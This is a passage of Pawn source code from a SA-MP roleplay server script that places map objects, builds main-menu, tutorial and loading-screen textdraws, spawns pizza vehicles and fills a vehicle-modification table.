	CreateDynamicObject(1703,2533.08276367,1399.54919434,7696.58251953,0.00000000,0.00000000,259.00000000); //object(kb_couch02) (7)
	CreateDynamicObject(1703,2529.77880859,1391.14709473,7696.58251953,0.00000000,0.00000000,234.99719238); //object(kb_couch02) (8)
	CreateDynamicObject(1753,2518.78100586,1441.38500977,7696.97753906,0.00000000,0.49987793,308.24658203); //object(swank_couch_1) (3)
	CreateDynamicObject(1753,2521.59692383,1436.83740234,7696.97753906,0.00000000,0.49987793,283.99334717); //object(swank_couch_1) (4)
	CreateDynamicObject(14809,2514.50146484,1439.01867676,7698.00341797,0.00000000,0.00000000,269.75000000); //object(strip2_platforms) (1)
	CreateDynamicObject(16101,2517.80371094,1435.93750000,7705.97753906,0.00000000,180.00000000,0.00000000); //object(des_windsockpole) (3)
	CreateDynamicObject(2004,2547.08203125,1402.87194824,7700.60693359,0.00000000,0.00000000,180.75000000); //object(cr_safe_door) (1)
	CreateDynamicObject(18648,2574.30322266,1430.06726074,7705.38964844,0.00000000,0.00000000,90.00000000); //object(trdpillar01) (1)
	CreateDynamicObject(18648,2574.33300781,1405.45104980,7705.39013672,0.00000000,0.00000000,90.00000000); //object(trdpillar01) (1)
	CreateDynamicObject(18655,2523.20751953,1431.59301758,7696.54589844,0.00000000,0.00000000,50.00000000); //object(trdpillar01) (1)
	CreateDynamicObject(18655,2502.90087891,1404.33312988,7696.14160156,0.00000000,0.00000000,210.00000000); //object(trdpillar01) (1)
	CreateDynamicObject(18655,2523.31250000,1404.46948242,7696.14160156,0.00000000,0.00000000,310.00000000); //object(trdpillar01) (2)
	CreateDynamicObject(18655,2502.92797852,1431.71264648,7696.14599609,0.00000000,0.00000000,150.00000000); //object(trdpillar01) (1)
	CreateDynamicObject(18648,2514.53857422,1431.92138672,7706.11523438,0.00000000,0.00000000,264.49768066); //object(whiten) (1)
	CreateDynamicObject(18648,2502.94531250,1418.95727539,7705.86865234,0.00000000,0.00000000,358.25000000); //object(whiten) (1)
	CreateDynamicObject(18648,2512.54833984,1404.22753906,7706.46093750,0.00000000,0.00000000,88.24768066); //object(pinkn) (1)
	CreateDynamicObject(18648,2524.80029297,1417.05432129,7705.85693359,0.00000000,0.00000000,175.49768066); //object(pinkn) (1)
	CreateDynamicObject(19129,2513.15600586,1418.46594238,7696.64794922,0.00000000,0.00000000,0.00000000); //object(dancefloor) (1)
	CreateDynamicObject(18885,2561.32519531,1403.24609375,7699.56640625,0.00000000,0.00000000,179.50000000); //object(gunlocker) (1)
	CreateDynamicObject(14782,2555.62255859,1403.19152832,7699.47363281,0.00000000,0.00000000,179.49462891); //object(pdomesbar) (1)
	CreateDynamicObject(18885,2549.56079102,1403.30615234,7699.56640625,0.00000000,0.00000000,179.49462891); //object(gunlocker) (1)
	CreateDynamicObject(18646,2524.76708984,1404.45544434,7706.96542969,0.00000000,0.00000000,0.00000000); //object(pd light) (2)
	CreateDynamicObject(18646,2524.73706055,1431.57739258,7706.96777344,0.00000000,0.00000000,0.00000000); //object(pd light) (2)
	CreateDynamicObject(18646,2503.03784180,1431.67236328,7706.96777344,0.00000000,0.00000000,0.00000000); //object(pd light) (2)
	CreateDynamicObject(18646,2503.04516602,1404.47290039,7706.96337891,0.00000000,0.00000000,0.00000000); //object(pd light) (2)
	CreateDynamicObject(18646,2555.37280273,1413.67517090,7702.10400391,0.00000000,0.00000000,0.00000000); //object(pd light) (2)
	CreateDynamicObject(18646,2555.36938477,1421.85681152,7702.10400391,0.00000000,0.00000000,0.00000000); //object(pd light) (2)


//vip ls garage
	CreateObject(10010,-4398.91894531,871.42370605,985.81781006,0.00000000,0.00000000,356.03002930); //object(ugcarpark_sfe) (1)
	CreateDynamicObject(7891,-4432.70019531,906.73614502,988.49066162,0.00000000,0.00000000,90.00000000); //object(vgwspry1) (2)
	CreateDynamicObject(7891,-4425.47021484,906.73535156,988.49066162,0.00000000,0.00000000,90.00000000); //object(vgwspry1) (4)
	CreateDynamicObject(7891,-4432.70019531,906.73535156,993.03997803,0.00000000,0.00000000,90.00000000); //object(vgwspry1) (5)
	CreateDynamicObject(7891,-4425.46972656,906.73535156,993.03997803,0.00000000,0.00000000,90.00000000); //object(vgwspry1) (6)

//sf vip exterior
	RemoveBuildingForPlayer(-1, 10662, -2453.6563, 514.5000, 24.4375, 0.25);
	RemoveBuildingForPlayer(-1, 966, -2436.8516, 495.4531, 28.9531, 0.25);
	RemoveBuildingForPlayer(-1, 967, -2438.7266, 495.0078, 29.1016, 0.25);
	RemoveBuildingForPlayer(-1, 968, -2436.8125, 495.4688, 29.6797, 0.25);
	RemoveBuildingForPlayer(-1, 10611, -2453.6563, 514.5000, 24.4375, 0.25);


	//Anim stopper message
	txtAnimHelper = TextDrawCreate(630.0, 420.0, "~r~~k~~PED_SPRINT~ ~w~to stop the animation");
	TextDrawUseBox(txtAnimHelper, 0);
	TextDrawFont(txtAnimHelper, 2);
	TextDrawSetShadow(txtAnimHelper,0);
    TextDrawSetOutline(txtAnimHelper,1);
    TextDrawBackgroundColor(txtAnimHelper,0x000000FF);
    TextDrawColor(txtAnimHelper,0xFFFFFFFF);
    TextDrawAlignment(txtAnimHelper,3);

	// WristWatch
	WristWatch = TextDrawCreate(549.000000, 16.000000, string);
	TextDrawBackgroundColor(WristWatch, 255);
	TextDrawFont(WristWatch, 3);
	TextDrawLetterSize(WristWatch, 0.589999, 2.299998);
	TextDrawColor(WristWatch, -1);
	TextDrawSetOutline(WristWatch, 1);
	TextDrawSetProportional(WristWatch, 1);

	MainMenuTxtdraw[0] = TextDrawCreate(315.000000, 26.000000, "Next Generation Roleplay");
	TextDrawAlignment(MainMenuTxtdraw[0], 2);
	TextDrawBackgroundColor(MainMenuTxtdraw[0], 255);
	TextDrawFont(MainMenuTxtdraw[0], 3);
	TextDrawLetterSize(MainMenuTxtdraw[0], 0.949999, 3.199999);
	TextDrawColor(MainMenuTxtdraw[0], -4);
	TextDrawSetOutline(MainMenuTxtdraw[0], 1);
	TextDrawSetProportional(MainMenuTxtdraw[0], 1);

	MainMenuTxtdraw[1] = TextDrawCreate(639.000000, -1.000000, "'");
	TextDrawAlignment(MainMenuTxtdraw[1], 3);
	TextDrawBackgroundColor(MainMenuTxtdraw[1], 255);
	TextDrawFont(MainMenuTxtdraw[1], 1);
	TextDrawLetterSize(MainMenuTxtdraw[1], 0.239999, 10.900000);
	TextDrawColor(MainMenuTxtdraw[1], 255);
	TextDrawSetOutline(MainMenuTxtdraw[1], 0);
	TextDrawSetProportional(MainMenuTxtdraw[1], 1);
	TextDrawSetShadow(MainMenuTxtdraw[1], 1);
	TextDrawUseBox(MainMenuTxtdraw[1], 1);
	TextDrawBoxColor(MainMenuTxtdraw[1], 255);
	TextDrawTextSize(MainMenuTxtdraw[1], 102.000000, 330.000000);

	MainMenuTxtdraw[2] = TextDrawCreate(679.000000, 100.000000, "'");
	TextDrawAlignment(MainMenuTxtdraw[2], 3);
	TextDrawBackgroundColor(MainMenuTxtdraw[2], 255);
	TextDrawFont(MainMenuTxtdraw[2], 1);
	TextDrawLetterSize(MainMenuTxtdraw[2], 0.340000, 0.100001);
	TextDrawColor(MainMenuTxtdraw[2], -5963521);
	TextDrawSetOutline(MainMenuTxtdraw[2], 0);
	TextDrawSetProportional(MainMenuTxtdraw[2], 1);
	TextDrawSetShadow(MainMenuTxtdraw[2], 1);
	TextDrawUseBox(MainMenuTxtdraw[2], 1);
	TextDrawBoxColor(MainMenuTxtdraw[2], -3);
	TextDrawTextSize(MainMenuTxtdraw[2], 102.000000, 349.000000);

	MainMenuTxtdraw[3] = TextDrawCreate(312.000000, 55.000000, SERVER_VERSION);
	TextDrawAlignment(MainMenuTxtdraw[3], 2);
	TextDrawBackgroundColor(MainMenuTxtdraw[3], 255);
	TextDrawFont(MainMenuTxtdraw[3], 2);
	TextDrawLetterSize(MainMenuTxtdraw[3], 0.670000, 2.299998);
	TextDrawColor(MainMenuTxtdraw[3], -4);
	TextDrawSetOutline(MainMenuTxtdraw[3], 0);
	TextDrawSetProportional(MainMenuTxtdraw[3], 1);
	TextDrawSetShadow(MainMenuTxtdraw[3], 5);

	MainMenuTxtdraw[4] = TextDrawCreate(639.000000, 339.000000, "'");
	TextDrawAlignment(MainMenuTxtdraw[4], 3);
	TextDrawBackgroundColor(MainMenuTxtdraw[4], 255);
	TextDrawFont(MainMenuTxtdraw[4], 1);
	TextDrawLetterSize(MainMenuTxtdraw[4], 0.239999, 11.900000);
	TextDrawColor(MainMenuTxtdraw[4], 255);
	TextDrawSetOutline(MainMenuTxtdraw[4], 0);
	TextDrawSetProportional(MainMenuTxtdraw[4], 1);
	TextDrawSetShadow(MainMenuTxtdraw[4], 1);
	TextDrawUseBox(MainMenuTxtdraw[4], 1);
	TextDrawBoxColor(MainMenuTxtdraw[4], 255);
	TextDrawTextSize(MainMenuTxtdraw[4], 102.000000, 330.000000);

	MainMenuTxtdraw[5] = TextDrawCreate(679.000000, 338.000000, "'");
	TextDrawAlignment(MainMenuTxtdraw[5], 3);
	TextDrawBackgroundColor(MainMenuTxtdraw[5], 255);
	TextDrawFont(MainMenuTxtdraw[5], 1);
	TextDrawLetterSize(MainMenuTxtdraw[5], 0.340000, 0.100001);
	TextDrawColor(MainMenuTxtdraw[5], 255);
	TextDrawSetOutline(MainMenuTxtdraw[5], 0);
	TextDrawSetProportional(MainMenuTxtdraw[5], 1);
	TextDrawSetShadow(MainMenuTxtdraw[5], 1);
	TextDrawUseBox(MainMenuTxtdraw[5], 1);
	TextDrawBoxColor(MainMenuTxtdraw[5], 255);
	TextDrawTextSize(MainMenuTxtdraw[5], 102.000000, 349.000000);

	new newsstring[128];
	format(newsstring, sizeof(newsstring), "News: %s", GlobalMOTD);
	MainMenuTxtdraw[6] = TextDrawCreate(322.000000, 355.000000, newsstring);
	TextDrawAlignment(MainMenuTxtdraw[6], 2);
	TextDrawBackgroundColor(MainMenuTxtdraw[6], 255);
	TextDrawFont(MainMenuTxtdraw[6], 1);
	TextDrawLetterSize(MainMenuTxtdraw[6], 0.500000, 2.499999);
	TextDrawColor(MainMenuTxtdraw[6], -1);
	TextDrawSetOutline(MainMenuTxtdraw[6], 0);
	TextDrawSetProportional(MainMenuTxtdraw[6], 1);
	TextDrawSetShadow(MainMenuTxtdraw[6], 1);

	MainMenuTxtdraw[7] = TextDrawCreate(313.000000, 383.000000, "Players online:");
	TextDrawAlignment(MainMenuTxtdraw[7], 2);
	TextDrawBackgroundColor(MainMenuTxtdraw[7], 255);
	TextDrawFont(MainMenuTxtdraw[7], 1);
	TextDrawLetterSize(MainMenuTxtdraw[7], 0.600000, 2.600000);
	TextDrawColor(MainMenuTxtdraw[7], -5963521);
	TextDrawSetOutline(MainMenuTxtdraw[7], 0);
	TextDrawSetProportional(MainMenuTxtdraw[7], 1);
	TextDrawSetShadow(MainMenuTxtdraw[7], 1);

	MainMenuTxtdraw[8] = TextDrawCreate(77.000000, 414.000000, "Website:");
	TextDrawBackgroundColor(MainMenuTxtdraw[8], 255);
	TextDrawFont(MainMenuTxtdraw[8], 1);
	TextDrawLetterSize(MainMenuTxtdraw[8], 0.469999, 2.199999);
	TextDrawColor(MainMenuTxtdraw[8], -5963521);
	TextDrawSetOutline(MainMenuTxtdraw[8], 0);
	TextDrawSetProportional(MainMenuTxtdraw[8], 1);
	TextDrawSetShadow(MainMenuTxtdraw[8], 1);

	MainMenuTxtdraw[9] = TextDrawCreate(144.000000, 414.000000, WEBSITE);
	TextDrawBackgroundColor(MainMenuTxtdraw[9], 255);
	TextDrawFont(MainMenuTxtdraw[9], 1);
	TextDrawLetterSize(MainMenuTxtdraw[9], 0.469999, 2.199999);
	TextDrawColor(MainMenuTxtdraw[9], -1);
	TextDrawSetOutline(MainMenuTxtdraw[9], 0);
	TextDrawSetProportional(MainMenuTxtdraw[9], 1);
	TextDrawSetShadow(MainMenuTxtdraw[9], 1);

	//------------------------------------------------------------------------------------------------------------
	// Tutorial text draws
	//------------------------------------------------------------------------------------------------------------
	TutTxtDraw[0] = TextDrawCreate(487.000000, 303.000000, "'");
	TextDrawBackgroundColor(TutTxtDraw[0], 255);
	TextDrawFont(TutTxtDraw[0], 2);
	TextDrawLetterSize(TutTxtDraw[0], 0.000000, 12.800003);
	TextDrawColor(TutTxtDraw[0], -1061109505);
	TextDrawSetOutline(TutTxtDraw[0], 0);
	TextDrawSetProportional(TutTxtDraw[0], 1);
	TextDrawSetShadow(TutTxtDraw[0], 1);
	TextDrawUseBox(TutTxtDraw[0], 1);
	TextDrawBoxColor(TutTxtDraw[0], 170);
	TextDrawTextSize(TutTxtDraw[0], 146.000000, 45.000000);

	TutTxtDraw[1] = TextDrawCreate(487.000000, 303.000000, "'");
	TextDrawBackgroundColor(TutTxtDraw[1], 255);
	TextDrawFont(TutTxtDraw[1], 1);
	TextDrawLetterSize(TutTxtDraw[1], 0.000000, -1.000000);
	TextDrawColor(TutTxtDraw[1], -1);
	TextDrawSetOutline(TutTxtDraw[1], 0);
	TextDrawSetProportional(TutTxtDraw[1], 1);
	TextDrawSetShadow(TutTxtDraw[1], 1);
	TextDrawUseBox(TutTxtDraw[1], 1);
	TextDrawBoxColor(TutTxtDraw[1], 255);
	TextDrawTextSize(TutTxtDraw[1], 146.000000, -2.000000);

	TutTxtDraw[2] = TextDrawCreate(487.000000, 427.000000, "'");
	TextDrawBackgroundColor(TutTxtDraw[2], 255);
	TextDrawFont(TutTxtDraw[2], 1);
	TextDrawLetterSize(TutTxtDraw[2], 0.000000, -1.000000);
	TextDrawColor(TutTxtDraw[2], -1);
	TextDrawSetOutline(TutTxtDraw[2], 0);
	TextDrawSetProportional(TutTxtDraw[2], 1);
	TextDrawSetShadow(TutTxtDraw[2], 1);
	TextDrawUseBox(TutTxtDraw[2], 1);
	TextDrawBoxColor(TutTxtDraw[2], 255);
	TextDrawTextSize(TutTxtDraw[2], 146.000000, -2.000000);

	TutTxtDraw[3] = TextDrawCreate(147.000000, 299.000000, "'");
	TextDrawBackgroundColor(TutTxtDraw[3], 255);
	TextDrawFont(TutTxtDraw[3], 1);
	TextDrawLetterSize(TutTxtDraw[3], 0.000000, 13.600002);
	TextDrawColor(TutTxtDraw[3], -1);
	TextDrawSetOutline(TutTxtDraw[3], 0);
	TextDrawSetProportional(TutTxtDraw[3], 1);
	TextDrawSetShadow(TutTxtDraw[3], 1);
	TextDrawUseBox(TutTxtDraw[3], 1);
	TextDrawBoxColor(TutTxtDraw[3], 255);
	TextDrawTextSize(TutTxtDraw[3], 146.000000, 28.000000);

	TutTxtDraw[4] = TextDrawCreate(487.000000, 299.000000, "'");
	TextDrawBackgroundColor(TutTxtDraw[4], 255);
	TextDrawFont(TutTxtDraw[4], 1);
	TextDrawLetterSize(TutTxtDraw[4], 0.000000, 13.600002);
	TextDrawColor(TutTxtDraw[4], -4);
	TextDrawSetOutline(TutTxtDraw[4], 0);
	TextDrawSetProportional(TutTxtDraw[4], 1);
	TextDrawSetShadow(TutTxtDraw[4], 1);
	TextDrawUseBox(TutTxtDraw[4], 1);
	TextDrawBoxColor(TutTxtDraw[4], 255);
	TextDrawTextSize(TutTxtDraw[4], 486.000000, 34.000000);

	TutTxtDraw[5] = TextDrawCreate(165.000000, 301.000000, "NGRP Tutorial");
	TextDrawBackgroundColor(TutTxtDraw[5], 255);
	TextDrawFont(TutTxtDraw[5], 2);
	TextDrawLetterSize(TutTxtDraw[5], 0.500000, 2.200000);
	TextDrawColor(TutTxtDraw[5], -4);
	TextDrawSetOutline(TutTxtDraw[5], 0);
	TextDrawSetProportional(TutTxtDraw[5], 1);
	TextDrawSetShadow(TutTxtDraw[5], 3);

	//
	// FIRST TUTORIAL TEXT
	//

	TutTxtDraw[6] = TextDrawCreate(166.000000, 331.000000, "Welcome to Next Generation Roleplay. This is a roleplay server based on old school NGRP.");
	TextDrawBackgroundColor(TutTxtDraw[6], 255);
	TextDrawFont(TutTxtDraw[6], 1);
	TextDrawLetterSize(TutTxtDraw[6], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[6], -1);
	TextDrawSetOutline(TutTxtDraw[6], 0);
	TextDrawSetProportional(TutTxtDraw[6], 1);
	TextDrawSetShadow(TutTxtDraw[6], 2);

	TutTxtDraw[7] = TextDrawCreate(166.000000, 344.000000, "All job locations are as they were around the 2011 time period.");
	TextDrawBackgroundColor(TutTxtDraw[7], 255);
	TextDrawFont(TutTxtDraw[7], 1);
	TextDrawLetterSize(TutTxtDraw[7], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[7], -1);
	TextDrawSetOutline(TutTxtDraw[7], 0);
	TextDrawSetProportional(TutTxtDraw[7], 1);
	TextDrawSetShadow(TutTxtDraw[7], 2);

	TutTxtDraw[8] = TextDrawCreate(166.000000, 368.000000, "If you have any questions please ask on /Newb. And enjoy!");
	TextDrawBackgroundColor(TutTxtDraw[8], 255);
	TextDrawFont(TutTxtDraw[8], 1);
	TextDrawLetterSize(TutTxtDraw[8], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[8], -1);
	TextDrawSetOutline(TutTxtDraw[8], 0);
	TextDrawSetProportional(TutTxtDraw[8], 1);
	TextDrawSetShadow(TutTxtDraw[8], 2);

	TutTxtDraw[9] = TextDrawCreate(166.000000, 381.000000, "Special thanks to Nino, Goatse, Spenser, Cody, and our scripter LaKhWan!");
	TextDrawBackgroundColor(TutTxtDraw[9], 255);
	TextDrawFont(TutTxtDraw[9], 1);
	TextDrawLetterSize(TutTxtDraw[9], 0.209999, 1.399999);
	TextDrawColor(TutTxtDraw[9], -8);
	TextDrawSetOutline(TutTxtDraw[9], 0);
	TextDrawSetProportional(TutTxtDraw[9], 1);
	TextDrawSetShadow(TutTxtDraw[9], 2);



	//------------------------------------------------------------------------------------------------------------
	// Objects loading text draws
	//------------------------------------------------------------------------------------------------------------

	ObjectsLoadingTD[0] = TextDrawCreate(321.000000, 220.000000, "Interior objects loading...");
	TextDrawAlignment(ObjectsLoadingTD[0], 2);
	TextDrawBackgroundColor(ObjectsLoadingTD[0], 255);
	TextDrawFont(ObjectsLoadingTD[0], 1);
	TextDrawLetterSize(ObjectsLoadingTD[0], 0.570000, 2.800001);
	TextDrawColor(ObjectsLoadingTD[0], -1);
	TextDrawSetOutline(ObjectsLoadingTD[0], 0);
	TextDrawSetProportional(ObjectsLoadingTD[0], 1);
	TextDrawSetShadow(ObjectsLoadingTD[0], 3);

	ObjectsLoadingTD[1] = TextDrawCreate(455.000000, 266.000000, "'");
	TextDrawBackgroundColor(ObjectsLoadingTD[1], 255);
	TextDrawFont(ObjectsLoadingTD[1], 1);
	TextDrawLetterSize(ObjectsLoadingTD[1], -0.009999, -7.000000);
	TextDrawColor(ObjectsLoadingTD[1], 255);
	TextDrawSetOutline(ObjectsLoadingTD[1], 0);
	TextDrawSetProportional(ObjectsLoadingTD[1], 1);
	TextDrawSetShadow(ObjectsLoadingTD[1], 0);
	TextDrawUseBox(ObjectsLoadingTD[1], 1);
	TextDrawBoxColor(ObjectsLoadingTD[1], 0x000000AA);
	TextDrawTextSize(ObjectsLoadingTD[1], 185.000000, -37.000000);

	ObjectsLoadingTD[2] = TextDrawCreate(185.000000, 266.000000, "'");
	TextDrawBackgroundColor(ObjectsLoadingTD[2], 255);
	TextDrawFont(ObjectsLoadingTD[2], 1);
	TextDrawLetterSize(ObjectsLoadingTD[2], -0.009999, -7.000000);
	TextDrawColor(ObjectsLoadingTD[2], -1);
	TextDrawSetOutline(ObjectsLoadingTD[2], 0);
	TextDrawSetProportional(ObjectsLoadingTD[2], 1);
	TextDrawSetShadow(ObjectsLoadingTD[2], 0);
	TextDrawUseBox(ObjectsLoadingTD[2], 1);
	TextDrawBoxColor(ObjectsLoadingTD[2], 269488383);
	TextDrawTextSize(ObjectsLoadingTD[2], 185.000000, -37.000000);

	ObjectsLoadingTD[3] = TextDrawCreate(455.000000, 266.000000, "'");
	TextDrawBackgroundColor(ObjectsLoadingTD[3], 255);
	TextDrawFont(ObjectsLoadingTD[3], 1);
	TextDrawLetterSize(ObjectsLoadingTD[3], -0.009999, -7.000000);
	TextDrawColor(ObjectsLoadingTD[3], -1);
	TextDrawSetOutline(ObjectsLoadingTD[3], 0);
	TextDrawSetProportional(ObjectsLoadingTD[3], 1);
	TextDrawSetShadow(ObjectsLoadingTD[3], 0);
	TextDrawUseBox(ObjectsLoadingTD[3], 1);
	TextDrawBoxColor(ObjectsLoadingTD[3], 151587327);
	TextDrawTextSize(ObjectsLoadingTD[3], 455.000000, -37.000000);

	ObjectsLoadingTD[4] = TextDrawCreate(455.000000, 266.000000, "'");
	TextDrawBackgroundColor(ObjectsLoadingTD[4], 255);
	TextDrawFont(ObjectsLoadingTD[4], 1);
	TextDrawLetterSize(ObjectsLoadingTD[4], -0.009999, -1.000000);
	TextDrawColor(ObjectsLoadingTD[4], 255);
	TextDrawSetOutline(ObjectsLoadingTD[4], 0);
	TextDrawSetProportional(ObjectsLoadingTD[4], 1);
	TextDrawSetShadow(ObjectsLoadingTD[4], 0);
	TextDrawUseBox(ObjectsLoadingTD[4], 1);
	TextDrawBoxColor(ObjectsLoadingTD[4], 151587327);
	TextDrawTextSize(ObjectsLoadingTD[4], 185.000000, -87.000000);

	ObjectsLoadingTD[5] = TextDrawCreate(455.000000, 212.000000, "'");
	TextDrawBackgroundColor(ObjectsLoadingTD[5], 255);
	TextDrawFont(ObjectsLoadingTD[5], 1);
	TextDrawLetterSize(ObjectsLoadingTD[5], -0.009999, -1.000000);
	TextDrawColor(ObjectsLoadingTD[5], -1);
	TextDrawSetOutline(ObjectsLoadingTD[5], 0);
	TextDrawSetProportional(ObjectsLoadingTD[5], 1);
	TextDrawSetShadow(ObjectsLoadingTD[5], 0);
	TextDrawUseBox(ObjectsLoadingTD[5], 1);
	TextDrawBoxColor(ObjectsLoadingTD[5], 269488383);
	TextDrawTextSize(ObjectsLoadingTD[5], 185.000000, -37.000000);

	ObjectsLoadingTD[6] = TextDrawCreate(318.000000, 220.000000, "Interior objects loaded.");
	TextDrawAlignment(ObjectsLoadingTD[6], 2);
	TextDrawBackgroundColor(ObjectsLoadingTD[6], 255);
	TextDrawFont(ObjectsLoadingTD[6], 1);
	TextDrawLetterSize(ObjectsLoadingTD[6], 0.570000, 2.800001);
	TextDrawColor(ObjectsLoadingTD[6], -637073409);
	TextDrawSetOutline(ObjectsLoadingTD[6], 0);
	TextDrawSetProportional(ObjectsLoadingTD[6], 1);
	TextDrawSetShadow(ObjectsLoadingTD[6], 3);

    PizzaVehicles[0] = AddStaticVehicleEx(448,-1713.27, 1366.98, 7.19,0.00000000,3,6,300); //Pizzaboy
    PizzaVehicles[1] = AddStaticVehicleEx(448,-1712.27, 1366.98, 7.19,0.00000000,3,6,300); //Pizzaboy
    PizzaVehicles[2] = AddStaticVehicleEx(448,-1711.27, 1366.98, 7.19,358.00000000,3,6,300); //Pizzaboy
    PizzaVehicles[3] = AddStaticVehicleEx(448,-1710.27, 1366.98, 7.19,357.99499512,3,6,300); //Pizzaboy
    PizzaVehicles[4] = AddStaticVehicleEx(448,-1709.27, 1366.98, 7.19,357.99499512,3,6,300); //Pizzaboy
    PizzaVehicles[5] = AddStaticVehicleEx(448,-1707.27, 1366.98, 7.19,357.99499512,3,6,300); //Pizzaboy
    PizzaVehicles[6] = AddStaticVehicleEx(448,-1706.27, 1366.98, 7.19,357.99499512,3,6,300); //Pizzaboy
    PizzaVehicles[7] = AddStaticVehicleEx(448,-1705.27, 1366.98, 7.19,357.99499512,3,6,300); //Pizzaboy
    PizzaVehicles[8] = AddStaticVehicleEx(448,-1704.27, 1366.98, 7.19,357.99499512,3,6,300); //Pizzaboy
    PizzaVehicles[9] = AddStaticVehicleEx(448,-1703.27, 1366.98, 7.19,357.99499512,3,6,300); //Pizzaboy
    PizzaVehicles[10] = AddStaticVehicleEx(448,-1702.27, 1366.98, 7.19,357.99499512,3,6,300); //Pizzaboy
    PizzaVehicles[11] = AddStaticVehicleEx(448,-1701.27, 1366.98, 7.19,357.99499512,3,6,300); //Pizzaboy


	EventInfo[EventFamily] = 255;
	vehicleMods[0][4] = {1013, 1024, 0, 0};
	vehicleMods[0][6] = {1018, 1019, 1020, 1021};
	vehicleMods[1][0] = {1001, 1003, 0, 0};
	vehicleMods[1][1] = {1004, 1005, 0, 0};
	vehicleMods[1][2] = {1006, 0, 0, 0};
	vehicleMods[1][3] = {1007, 0, 0, 0};
	vehicleMods[1][4] = {1013, 0, 0, 0};
	vehicleMods[1][6] = {1019, 1020, 0, 0};
	vehicleMods[1][12] = {1143, 1145, 0, 0};
	vehicleMods[4][0] = {1002, 1016, 1000, 0};
	vehicleMods[4][3] = {1007, 0, 0, 0};
	vehicleMods[4][4] = {1013, 0, 0, 0};
	vehicleMods[4][6] = {1019, 1020, 1021, 0};
	vehicleMods[5][0] = {1000, 1001, 1014, 1023};
	vehicleMods[5][6] = {1018, 1019, 1020, 1021};
	vehicleMods[10][0] = {1001, 1003, 1023, 0};
	vehicleMods[10][3] = {1007, 0, 0, 0};
	vehicleMods[10][4] = {1013, 1024, 0, 0};
	vehicleMods[10][6] = {1019, 1020, 1021, 0};
	vehicleMods[15][0] = {1001, 1003, 1023, 0};
	vehicleMods[15][6] = {1018, 1019, 0, 0};
	vehicleMods[15][3] = {1007, 0, 0, 0};
	vehicleMods[18][0] = {1002, 1016, 0, 0};
	vehicleMods[18][2] = {1006, 0, 0, 0};
	vehicleMods[18][6] = {1020, 1021, 0, 0};
	vehicleMods[20][0] = {1001, 1003, 0, 0};
	vehicleMods[20][1] = {1004, 1005, 0, 0};
	vehicleMods[20][6] = {1019, 1021, 0, 0};
	vehicleMods[21][0] = {1000, 1014, 1016, 1023};
	vehicleMods[21][6] = {1018, 1019, 1020, 1021};
	vehicleMods[22][3] = {1007, 0, 0, 0};
	vehicleMods[22][4] = {1013, 0, 0, 0};
	vehicleMods[22][6] = {1019, 1020, 1021, 0};
	vehicleMods[26][0] = {1001, 1003, 0, 0};
	vehicleMods[26][1] = {1004, 1005, 0, 0};
	vehicleMods[26][2] = {1006, 0, 0, 0};
	vehicleMods[26][6] = {1019, 1021, 0, 0};
	vehicleMods[36][0] = {1001, 1003, 0, 0};
	vehicleMods[36][2] = {1006, 0, 0, 0};
	vehicleMods[36][3] = {1007, 0, 0, 0};
	vehicleMods[36][4] = {1013, 0, 0, 0};
	vehicleMods[36][6] = {1019, 1020, 1021, 1022};
	vehicleMods[39][0] = {1001, 1003, 1023, 0};
	vehicleMods[39][3] = {1007, 0, 0, 0};
	vehicleMods[39][4] = {1013, 0, 0, 0};
	vehicleMods[39][12] = {1143, 1145, 0, 0};
	vehicleMods[77][2] = {1006, 0, 0, 0};
	vehicleMods[77][3] = {1007, 0, 0, 0};
	vehicleMods[77][6] = {1018, 1019, 1020, 1021};
	vehicleMods[78][1] = {1004, 1005, 1012, 0};
	vehicleMods[78][4] = {1013, 1024, 0, 0};
	vehicleMods[78][6] = {1020, 1021, 1022, 0};
	vehicleMods[89][0] = {1000, 1002, 1016, 0};
	vehicleMods[89][1] = {1004, 1005, 0, 0};
	vehicleMods[89][2] = {1006, 0, 0, 0};
	vehicleMods[89][4] = {1013, 1024, 0, 0};
	vehicleMods[89][6] = {1018, 1019, 1020, 0};
	vehicleMods[91][0] = {1003, 1014, 1023, 0};
	vehicleMods[91][3] = {1007, 0, 0, 0};
	vehicleMods[91][6] = {1018, 1019, 1020, 1021};
	vehicleMods[91][12] = {1143, 1145, 0, 0};
	vehicleMods[92][0] = {1000, 1016, 0, 0};
	vehicleMods[92][1] = {1004, 1005, 0, 0};
	vehicleMods[92][2] = {1006, 0, 0, 0};
	vehicleMods[96][0] = {1001, 1002, 1003, 1023};
	vehicleMods[96][1] = {1011, 0, 0, 0};
	vehicleMods[96][2] = {1006, 0, 0, 0};
	vehicleMods[96][6] = {1019, 1020, 0, 0};
	vehicleMods[96][12] = {1143, 0, 0, 0};
	vehicleMods[100][4] = {1013, 1024, 0, 0};
	vehicleMods[100][6] = {1019, 1020, 1021, 0};
	vehicleMods[116][0] = {1000, 1002, 1015, 1016};
	vehicleMods[116][1] = {1004, 0, 0, 0};
	vehicleMods[116][3] = {1007, 0, 0, 0};
	vehicleMods[116][6] = {1018, 1019, 1020, 1021};
	vehicleMods[117][0] = {1002, 1003, 1016, 1023};
	vehicleMods[117][3] = {1007, 0, 0, 0};
	vehicleMods[117][6] = {1018, 1019, 1020, 0};
	vehicleMods[117][12] = {1143, 1145, 0, 0};
	vehicleMods[118][0] = {1001, 1003, 1023, 0};
	vehicleMods[118][1] = {1005, 0, 0, 0};
	vehicleMods[118][2] = {1006, 0, 0, 0};
	vehicleMods[118][3] = {1007, 0, 0, 0};
	vehicleMods[118][4] = {1013, 0, 0, 0};
	vehicleMods[118][6] = {1018, 1020, 0, 0};
	vehicleMods[118][12] = {1143, 1145, 0, 0};
	vehicleMods[127][0] = {1001, 1014, 1015, 0};
	vehicleMods[127][3] = {1007, 0, 0, 0};
	vehicleMods[127][6] = {1018, 1020, 1021, 0};
	vehicleMods[129][0] = {1001, 1003, 1023, 0};
	vehicleMods[129][1] = {1011, 1012, 0, 0};
	vehicleMods[129][2] = {1006, 0, 0, 0};
	vehicleMods[129][3] = {1007, 0, 0, 0};
	vehicleMods[129][6] = {1018, 1019, 1020, 0};
	vehicleMods[134][1] = {1100, 1123, 1125, 0};
	vehicleMods[134][3] = {1101, 1106, 0, 0};
	vehicleMods[134][6] = {1126, 1127, 0, 0};
	vehicleMods[134][10] = {1179, 1185, 0, 0};
	vehicleMods[134][11] = {1178, 1180, 0, 0};
	vehicleMods[135][3] = {1118, 1119, 0, 0};
	vehicleMods[135][6] = {1113, 1114, 0, 0};
